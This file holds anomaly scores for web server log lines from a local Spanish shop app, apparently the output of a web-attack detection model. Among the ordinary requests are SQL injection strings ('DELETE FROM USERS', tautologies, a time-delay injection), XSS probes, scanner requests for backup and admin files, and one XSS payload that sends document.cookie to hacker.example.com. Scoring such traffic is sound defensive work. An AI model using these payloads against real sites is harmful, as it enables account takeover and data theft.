score_content,score_session,score_fused,score_fused_norm,line
3.035055637359619,0.7568849325180054,1.8959702849388123,1.8959702849388123,localhost:8080 - - [10/Jan/2025:14:53:20 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
90.101318359375,0.8500089049339294,45.475663632154465,45.475663632154465,localhost:8080 - - [10/Jan/2025:14:53:21 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carvalho&password=De42AE0&nombre=Saddam&apellidos=Ponsat%ED+Lemunao&email=bascomb%40elpaisaje.pro&dni=31723380D&direccion=Barri+Sant+Julia+120%2C+13%3FA&ciudad=Palencia+de+Negrilla&cp=4623A&provincia=Almer%EDa&ntc=1165920681066048&B1=Registrar HTTP/1.1 HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.8683714866638184,1.9517135620117188,1.9517135620117188,localhost:8080 - - [10/Jan/2025:14:53:21 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
90.57946014404297,0.9573403000831604,45.768400222063065,45.768400222063065,localhost:8080 - - [10/Jan/2025:14:53:21 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carvalho&password=De42AE0&nombre=Saddam&apellidos=Ponsat%ED+Lemunao&email=bascomb%40elpaisaje.pro&dni=31723380D&direccion=Barri+Sant+Julia+120%2C+13%3FA&ciudad=Palencia+de+Negrilla&cp=50155&provincia=Almer%EDa&ntc=1165920681066048&B1A=Registrar HTTP/1.1 HTTP/1.1" 200 969 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,0.9564358592033386,1.9957457482814789,1.9957457482814789,localhost:8080 - - [10/Jan/2025:14:53:21 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7503013610839844,1.0564509630203247,1.4033761620521545,1.4033761620521545,localhost:8080 - - [10/Jan/2025:14:53:22 +0000] "GET http://localhost:8080/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.129724144935608,1.0373024940490723,1.08351331949234,1.08351331949234,localhost:8080 - - [10/Jan/2025:14:53:22 +0000] "GET http://localhost:8080/tienda1/imagenes/1.gif/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 219 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2925868332386017,1.021810531616211,0.6571986824274063,0.6571986824274063,localhost:8080 - - [10/Jan/2025:14:53:22 +0000] "GET http://localhost:8080/asf-logo-wide.gif.Inc HTTP/1.1 HTTP/1.1" 200 156 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.15264539420604706,1.0077060461044312,0.5801757201552391,0.5801757201552391,localhost:8080 - - [10/Jan/2025:14:53:22 +0000] "GET http://localhost:8080/mail.box HTTP/1.1 HTTP/1.1" 200 117 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2184963822364807,1.009495735168457,0.6139960587024689,0.6139960587024689,localhost:8080 - - [10/Jan/2025:14:53:23 +0000] "GET http://localhost:8080/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7089213132858276,1.0327399969100952,1.3708306550979614,1.3708306550979614,localhost:8080 - - [10/Jan/2025:14:53:23 +0000] "GET http://localhost:8080/ HTTP/1.1 HTTP/1.1" 200 93 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2925868332386017,1.0159409046173096,0.6542638689279556,0.6542638689279556,localhost:8080 - - [10/Jan/2025:14:53:23 +0000] "GET http://localhost:8080/tienda1/index.jsp.OLD HTTP/1.1 HTTP/1.1" 200 156 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.7983341217041,0.9328057169914246,15.365569919347763,15.365569919347763,localhost:8080 - - [10/Jan/2025:14:53:23 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85%2F&cantidad=74&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.9330161213874817,1.9683590233325958,1.9683590233325958,localhost:8080 - - [10/Jan/2025:14:53:24 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.48676872253418,0.8563941121101379,15.171581417322159,15.171581417322159,localhost:8080 - - [10/Jan/2025:14:53:24 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=39&cantidad=74&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.8566008806228638,1.9301514029502869,1.9301514029502869,localhost:8080 - - [10/Jan/2025:14:53:24 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
30.941919326782227,0.8655277490615845,15.903723537921906,15.903723537921906,localhost:8080 - - [10/Jan/2025:14:53:24 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cupid&pwd=ar9ada&remember=on%27+DELETE+FROM+USERS&B1=Entrar HTTP/1.1 HTTP/1.1" 200 417 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.8653352856636047,2.00234392285347,2.00234392285347,localhost:8080 - - [10/Jan/2025:14:53:25 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
27.626014709472656,0.8854403495788574,14.255727529525757,14.255727529525757,localhost:8080 - - [10/Jan/2025:14:53:25 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cupid&pwd=%2520&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.7476937770843506,1.9435231685638428,1.9435231685638428,localhost:8080 - - [10/Jan/2025:14:53:25 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.181947708129883,0.7505626082420349,14.966255158185959,14.966255158185959,localhost:8080 - - [10/Jan/2025:14:53:25 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%3F%3Fhorst%3F6&pwd=ar9ada&remember=on&B1=Entrar HTTP/1.1 HTTP/1.1" 200 384 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.6569289565086365,1.8981407582759857,1.8981407582759857,localhost:8080 - - [10/Jan/2025:14:53:26 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.445117950439453,0.6535278558731079,12.04932290315628,12.04932290315628,localhost:8080 - - [10/Jan/2025:14:53:26 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%3F HTTP/1.1 HTTP/1.1" 200 219 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.558536171913147,1.952890694141388,1.952890694141388,localhost:8080 - - [10/Jan/2025:14:53:26 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.388172149658203,0.5546709299087524,11.971421539783478,11.971421539783478,localhost:8080 - - [10/Jan/2025:14:53:26 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.347245216369629,0.45714640617370605,1.9021958112716675,1.9021958112716675,localhost:8080 - - [10/Jan/2025:14:53:27 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2521088719367981,0.4588143229484558,0.35546159744262695,0.35546159744262695,localhost:8080 - - [10/Jan/2025:14:53:27 +0000] "GET http://localhost:8080/jstl-war/index.html HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.8623508214950562,0.45694345235824585,0.659647136926651,0.659647136926651,localhost:8080 - - [10/Jan/2025:14:53:27 +0000] "GET http://localhost:8080/CFIDE/administrator/welcomefooter.cfm HTTP/1.1 HTTP/1.1" 200 204 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
26.388683319091797,0.4699021279811859,13.429292723536491,13.429292723536491,localhost:8080 - - [10/Jan/2025:14:53:27 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27OR%27a%3D%27a HTTP/1.1 HTTP/1.1" 200 321 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.48631516098976135,1.7450085431337357,1.7450085431337357,localhost:8080 - - [10/Jan/2025:14:53:28 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.279376983642578,0.37978410720825195,11.829580545425415,11.829580545425415,localhost:8080 - - [10/Jan/2025:14:53:28 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%3F HTTP/1.1 HTTP/1.1" 200 210 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.39736679196357727,1.7005343586206436,1.7005343586206436,localhost:8080 - - [10/Jan/2025:14:53:28 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
24.849061965942383,0.3912454843521118,12.620153725147247,12.620153725147247,localhost:8080 - - [10/Jan/2025:14:53:28 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.3914625644683838,1.6975822448730469,1.6975822448730469,localhost:8080 - - [10/Jan/2025:14:53:29 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.94103240966797,0.3868364989757538,13.163934454321861,13.163934454321861,localhost:8080 - - [10/Jan/2025:14:53:29 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2681&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.38716015219688416,1.6806092709302902,1.6806092709302902,localhost:8080 - - [10/Jan/2025:14:53:29 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
25.7272891998291,0.3802274465560913,13.053758323192596,13.053758323192596,localhost:8080 - - [10/Jan/2025:14:53:29 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=2681&B1=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 303 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.9740583896636963,0.38096293807029724,1.6775106638669968,1.6775106638669968,localhost:8080 - - [10/Jan/2025:14:53:30 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7908916473388672,0.4783790707588196,1.1346353590488434,1.1346353590488434,localhost:8080 - - [10/Jan/2025:14:53:30 +0000] "GET http://localhost:8080/tienda1/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 156 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6505740880966187,0.579484224319458,1.1150291562080383,1.1150291562080383,localhost:8080 - - [10/Jan/2025:14:53:30 +0000] "GET http://localhost:8080/_vti_bin/ HTTP/1.1 HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
92.9954605102539,0.6738265752792358,46.83464354276657,46.83464354276657,localhost:8080 - - [10/Jan/2025:14:53:30 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=farand&password=9A0r%2F%EDn1a&nombre=Geovana&apellidos=Figuera+Alonso&email=bozzufi_persoff%40tardos.name&dni=76657172N&direccion=Casas+Cementerio+33+&ciudad=Villanueva+de+los+Caballeros&cp=37291&provincia=Zaragoza&ntc=3509344027526428&B1=Registrar HTTP/1.1 HTTP/1.1" 200 984 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.6743906140327454,1.87125363945961,1.87125363945961,localhost:8080 - - [10/Jan/2025:14:53:31 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
91.54082489013672,0.7730185985565186,46.15692174434662,46.15692174434662,localhost:8080 - - [10/Jan/2025:14:53:31 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=farand&password=5o70e14ir&nombre=Geovana&apellidos=Figuera+Alonso&email=bozzufi_persoff%40tardos.name&dni=76657172N&direccion=Casas+Cementerio+33+&ciudad=Villanueva+de+los+Caballeros&cpA=37291&provincia=Zaragoza&ntc=3509344027526428&B1=Registrar HTTP/1.1 HTTP/1.1" 200 975 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0681166648864746,0.7734001278877258,1.9207583963871002,1.9207583963871002,localhost:8080 - - [10/Jan/2025:14:53:31 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5229076743125916,0.7581858038902283,0.6405467391014099,0.6405467391014099,localhost:8080 - - [10/Jan/2025:14:53:31 +0000] "GET http://localhost:8080/iissamples/dfault/samples.asp HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
31.283769607543945,0.7645400762557983,16.024154841899872,16.024154841899872,localhost:8080 - - [10/Jan/2025:14:53:32 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org HTTP/1.1 HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.7816601991653442,1.892681062221527,1.892681062221527,localhost:8080 - - [10/Jan/2025:14:53:32 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
23.626134872436523,0.7973052859306335,12.211720079183578,12.211720079183578,localhost:8080 - - [10/Jan/2025:14:53:32 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.7983404397964478,1.9010211825370789,1.9010211825370789,localhost:8080 - - [10/Jan/2025:14:53:32 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.702295184135437,0.8968632221221924,1.2995792031288147,1.2995792031288147,localhost:8080 - - [10/Jan/2025:14:53:33 +0000] "GET http://localhost:8080/tienda1/publico/ HTTP/1.1 HTTP/1.1" 200 141 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0728569030761719,0.880974531173706,0.976915717124939,0.976915717124939,localhost:8080 - - [10/Jan/2025:14:53:33 +0000] "GET http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
2.2206456661224365,0.9771728515625,1.5989092588424683,1.5989092588424683,localhost:8080 - - [10/Jan/2025:14:53:33 +0000] "GET http://localhost:8080/tienda1/global/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 195 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
206.41342163085938,1.247326374053955,103.83037400245667,103.83037400245667,localhost:8080 - - [10/Jan/2025:14:53:33 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=plsntp1&password=c%21uartilludo&nombre=Generosa&apellidos=Obrador+Scolari&email=metanee4%40martosfutbolsala.us&dni=55023331V&direccion=Cuesta+De+La+Independencia+107+7%3FH&ciudad=Bastida%2C+La&cp=50268&provincia=Guadalajara&ntc=7559315491846404sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1518 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,1.2467334270477295,2.1408945322036743,2.1408945322036743,localhost:8080 - - [10/Jan/2025:14:53:34 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
97.45027160644531,1.3526010513305664,49.40143632888794,49.40143632888794,localhost:8080 - - [10/Jan/2025:14:53:34 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&loginA=plsntp1&password=c%21uartilludo&nombre=Generosa&apellidos=Obrador+Scolari&email=metanee4%40martosfutbolsala.us&dni=55023331V&direccion=Cuesta+De+La+Independencia+107+7%3FH&ciudad=Bastida%2C+La&cp=50268&provincia=Guadalajara&ntc=7559315491846404&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1011 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.035055637359619,1.3515214920043945,2.193288564682007,2.193288564682007,localhost:8080 - - [10/Jan/2025:14:53:34 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.2714911699295044,1.335727572441101,0.8036093711853027,0.8036093711853027,localhost:8080 - - [10/Jan/2025:14:53:34 +0000] "GET http://localhost:8080/iisadmpwd/aexp2b.htr HTTP/1.1 HTTP/1.1" 200 153 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.42372503876686096,1.3165088891983032,0.8701169639825821,0.8701169639825821,localhost:8080 - - [10/Jan/2025:14:53:35 +0000] "GET http://localhost:8080/tienda1/imagenes/1.gif.OLD HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.4394971132278442,1.2000951766967773,1.3197961449623108,1.3197961449623108,localhost:8080 - - [10/Jan/2025:14:53:35 +0000] "GET http://localhost:8080/IISSamples/sdk/asp/database/Update_VBScript.asp HTTP/1.1 HTTP/1.1" 200 234 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0176841020584106,1.0815041065216064,1.0495941042900085,1.0495941042900085,localhost:8080 - - [10/Jan/2025:14:53:35 +0000] "GET http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.gif HTTP/1.1 HTTP/1.1" 200 213 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1590380221605301,0.9686782956123352,0.5638581588864326,0.5638581588864326,localhost:8080 - - [10/Jan/2025:14:53:35 +0000] "GET http://localhost:8080/tienda1.OLD HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5229076743125916,0.9504067301750183,0.7366572022438049,0.7366572022438049,localhost:8080 - - [10/Jan/2025:14:53:36 +0000] "GET http://localhost:8080/tienda1/imagenes/logo.gif.OLD HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.7165744304656982,0.9536026120185852,1.3350885212421417,1.3350885212421417,localhost:8080 - - [10/Jan/2025:14:53:36 +0000] "GET http://localhost:8080/WebSphereSamples/ HTTP/1.1 HTTP/1.1" 200 144 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
45.221046447753906,0.9797910451889038,23.100418746471405,23.100418746471405,localhost:8080 - - [10/Jan/2025:14:53:36 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=30%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 609 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.9980020523071289,2.0008519887924194,2.0008519887924194,localhost:8080 - - [10/Jan/2025:14:53:36 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.7983341217041,0.9962218999862671,15.397278010845184,15.397278010845184,localhost:8080 - - [10/Jan/2025:14:53:37 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=30&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,0.9957395195960999,1.999720722436905,1.999720722436905,localhost:8080 - - [10/Jan/2025:14:53:37 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
29.48676872253418,1.0019886493682861,15.244378685951233,15.244378685951233,localhost:8080 - - [10/Jan/2025:14:53:37 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=30&B1A=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.00370192527771,1.0011565685272217,2.002429246902466,2.002429246902466,localhost:8080 - - [10/Jan/2025:14:53:37 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.5975579619407654,0.884769082069397,0.7411635220050812,0.7411635220050812,localhost:8080 - - [10/Jan/2025:14:53:38 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp.java HTTP/1.1 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
31.283769607543945,0.9091702699661255,16.096469938755035,16.096469938755035,localhost:8080 - - [10/Jan/2025:14:53:38 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=reiman%22+AND+%221%22%3D%221&pwd=7asto&remember=off&B1=Entrar HTTP/1.1 HTTP/1.1" 200 423 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.139352560043335,0.813696563243866,1.9765245616436005,1.9765245616436005,localhost:8080 - - [10/Jan/2025:14:53:38 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
28.168193817138672,0.5468944907188416,14.357544153928757,14.357544153928757,localhost:8080 - - [10/Jan/2025:14:53:38 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=reiman&pwd=7asto&remember=on%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 363 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
